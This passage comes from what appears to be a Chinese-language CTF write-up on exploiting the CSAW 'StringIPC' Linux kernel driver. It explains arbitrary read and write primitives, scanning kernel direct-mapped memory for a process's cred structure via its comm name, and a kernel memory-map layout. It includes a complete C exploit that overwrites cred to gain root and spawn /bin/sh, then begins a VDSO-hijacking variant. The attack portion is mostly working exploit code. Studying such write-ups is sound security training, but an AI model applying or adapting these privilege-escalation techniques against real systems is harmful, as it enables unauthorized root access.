class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        seek_channel.id = channel_id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = channel_id;</span><br><span class="line">        write_channel.buf = (<span class="keyword">char</span>*)write_buff+i;</span><br><span class="line">        write_channel.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：由于驱动使用的 <code>strncpy_from_user</code> 会被 “\x00” 截断，所以 WAA 最好单字节多次输入</li>
</ul>
<p>Cred Attack：</p>
<p>内核结构体 <code>task_struct</code> 用于对进程/线程的所有的相关的信息进行维护，并进行管理：</p>
<ul>
<li>其中有个很重要的条目就是 <code>*cred</code> 指针，内核会根据 <code>cred</code> 结构体的内容来判断一个进程拥有的权限（如果 <code>cred</code> 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限）</li>
<li>想要定位 <code>task_struct</code> 结构体中的 <code>cred</code> 指针，需要用到 <code>task_struct</code> 中的另一个条目 <code>comm[TASK_COMM_LEN]</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * executable name, excluding path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment"> * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment"> * - lock it with task_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<ul>
<li><code>comm</code> 字符数组就在 <code>*cred</code> 相邻的下方，里面存放的这个字符串表示线程的名字（可以唯一确定），其内容可以通过 linux 的 <code>prctl(PR_SET_NAME,name)</code> 来设置指定的值</li>
<li><code>*real_cred</code> 和 <code>*cred</code> 的值相同，可以用于判断是否找到 <code>*cred</code></li>
<li>如果程序拥有局部 RAA，就可以通过扫描 <code>comm</code> 来找到 <code>*cred</code></li>
</ul>
<p>最后还需要确定一下扫描的范围： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffffffffffff</span>  ---+-----------+----------------------------------------------</span><br><span class="line">    <span class="number">8</span>M                 |           | unused hole                                   </span><br><span class="line"><span class="number">0xffffffffff7ff000</span>  ---|-----------+------------| FIXADDR_TOP |-------------------</span><br><span class="line">    <span class="number">1</span>M                 |           |                                               </span><br><span class="line"><span class="number">0xffffffffff600000</span>  ---+-----------+------------| VSYSCALL_ADDR |-----------------</span><br><span class="line">    <span class="number">548</span>K               |           | vsyscalls                                    </span><br><span class="line"><span class="number">0xffffffffff577000</span>  ---+-----------+------------| FIXADDR_START |-----------------</span><br><span class="line">    <span class="number">5</span>M                 |           | hole                                         </span><br><span class="line"><span class="number">0xffffffffff000000</span>  ---+-----------+------------| MODULES_END |------------------- </span><br><span class="line">    <span class="number">1520</span>M              |           | <span class="function"><span class="keyword">module</span> mapping <span class="title">space</span> <span class="params">(MODULES_LEN)</span>           </span></span><br><span class="line"><span class="function">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |-----------------</span></span><br><span class="line"><span class="function">    512M               |           | kernel text mapping, from phys 0         </span></span><br><span class="line"><span class="function">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |------------</span></span><br><span class="line"><span class="function">    2G                 |           | hole                                 </span></span><br><span class="line"><span class="function">0xffffffff00000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    64G                |           | EFI region mapping space                     </span></span><br><span class="line"><span class="function">0xffffffef00000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    444G               |           | hole                                         </span></span><br><span class="line"><span class="function">0xffffff8000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    16T                |           | %esp fixup stacks                             </span></span><br><span class="line"><span class="function">0xffffff0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    3T                 |           | hole                                         </span></span><br><span class="line"><span class="function">0xfffffc0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    16T                |           | kasan shadow <span class="title">memory</span> <span class="params">(<span class="number">16</span>TB)</span>                   </span></span><br><span class="line"><span class="function">0xffffec0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                         </span></span><br><span class="line"><span class="function">0xffffeb0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    1T                 |           | <span class="keyword">virtual</span> memory <span class="built_in">map</span> <span class="keyword">for</span> all of struct pages   </span></span><br><span class="line"><span class="function">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |-----------------</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                        </span></span><br><span class="line"><span class="function">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |-----------------</span></span><br><span class="line"><span class="function">    32T                |           | vmalloc/<span class="title">ioremap</span> <span class="params">(<span class="number">1</span> &lt;&lt; VMALLOC_SIZE_TB)</span>       </span></span><br><span class="line"><span class="function">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |-----------------</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                         </span></span><br><span class="line"><span class="function">0xffffc80000000000  ---+-----------+---------------------------------------------- </span></span><br><span class="line"><span class="function">    64T                |           | direct mapping of all phys. memory           </span></span><br><span class="line"><span class="function">                       |           | <span class="params">(<span class="number">1</span> &lt;&lt; MAX_PHYSMEM_BITS)</span>                       </span></span><br><span class="line"><span class="function">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | ------------</span></span><br><span class="line"><span class="function">    8T                 |           | guard hole, reserved <span class="keyword">for</span> hypervisor           </span></span><br><span class="line"><span class="function">0xffff800000000000 ----+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">                       |-----------| hole caused by [48:63] sign extension   </span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000800000000000</span> ----+-----------+----------------------------------------------</span><br><span class="line">    PAGE_SIZE          |           | guard page                                   </span><br><span class="line"><span class="number">0x00007ffffffff000</span> ----+-----------+--------------| TASK_SIZE_MAX | -------------- </span><br><span class="line">    <span class="number">128</span>T               |           | different per mm                            </span><br><span class="line"><span class="number">0x0000000000000000</span> ----+-----------+----------------------------------------------</span><br></pre></td></tr></table></figure>
<ul>
<li>直接映射区：0xffff880000000000 ~ 0xffffc80000000000（使用 kmalloc，分配的内存物理地址是连续的，虚拟地址也是连续的）</li>
<li>动态映射区：0xffffc90000000000 ~ 0xffffe90000000000（使用 vmalloc，分配的内存物理地址是不连续的，虚拟地址是连续的）</li>
<li>PS：<code>cred</code> 使用直接映射区</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line">    </span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        seek_channel.id = channel_id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = channel_id;</span><br><span class="line">        write_channel.buf = (<span class="keyword">char</span>*)write_buff+i;</span><br><span class="line">        write_channel.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">channel_alloc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">channel_shrink</span>;</span></span><br><span class="line">    <span class="keyword">int</span> channel_id;</span><br><span class="line">    <span class="keyword">char</span> * read_buff = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> * target = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred_addr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> root_cred[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_buff = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(name,<span class="string">&quot;try2findmesauce&quot;</span>);</span><br><span class="line">    prctl(PR_SET_NAME,name);</span><br><span class="line"></span><br><span class="line">    channel_alloc.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    channel_alloc.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;channel_alloc);</span><br><span class="line">    <span class="keyword">if</span>(channel_alloc.id == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;alloc channel wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;alloc channel id is :%d\n&quot;</span>,channel_alloc.id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    channel_id = channel_alloc.id;</span><br><span class="line">    channel_shrink.id = <span class="number">1</span>;</span><br><span class="line">    channel_shrink.size = <span class="number">0x101</span>;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;channel_shrink);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> addr = <span class="number">0xffff880000000000</span>;addr &lt; <span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        RAA(fd,channel_id,read_buff,addr,<span class="number">0x1000</span>);</span><br><span class="line">        target = memmem(read_buff,<span class="number">0x1000</span>,name,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(target != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            cred_addr = *(<span class="keyword">size_t</span> *)(target - <span class="number">0x8</span>);</span><br><span class="line">            real_cred_addr =  *(<span class="keyword">size_t</span> *)(target - <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span>(cred_addr == real_cred_addr)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;found cred at 0x%lx\n&quot;</span>,addr+target-(<span class="keyword">size_t</span>)read_buff);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;cred at 0x%lx\n&quot;</span>,cred_addr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cred_addr == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;not find cred&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WAA(fd,channel_id,root_cred,cred_addr,<span class="number">28</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;win~~~\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>VDSO Attack：（Ret2dir 的一种）</p>
<p>VDSO 是内核为了减少内核与用户空间频繁切换，提高系统调用效率而提出的机制，支持的系统调用有4个：</p>
<ul>
<li>gettimeofday()：把时间包装为一个结构体返回，包括秒，微妙，时区等信息</li>
<li>time()：获取当前的系统时间，返回一个大整数 </li>
<li>getcpu()：获取CPU信息</li>
<li>clock_gettime()：用于计算精度和纳秒</li>
</ul>
<p>入侵的思路很简单，就是利用 WAA 把 vdso 中用于替代系统调用的函数劫持为 shellcode，然后调用这些函数，获取 VDSO 基地址有如下步骤：</p>
<ul>
<li>在高版本的 glibc 中，读取 ELF 辅助向量，计算 <code>gettimeofday</code> 字符串的偏移，用于在后续的爆破中判断是否找到 VDSO 基地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    <span class="keyword">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!vdso_addr)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vdso_addr in user: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line">    <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>爆破获得 VDSO 地址，VDSO 是按页对齐的，且映射到空间的是个ELF文件</li>
</ul>
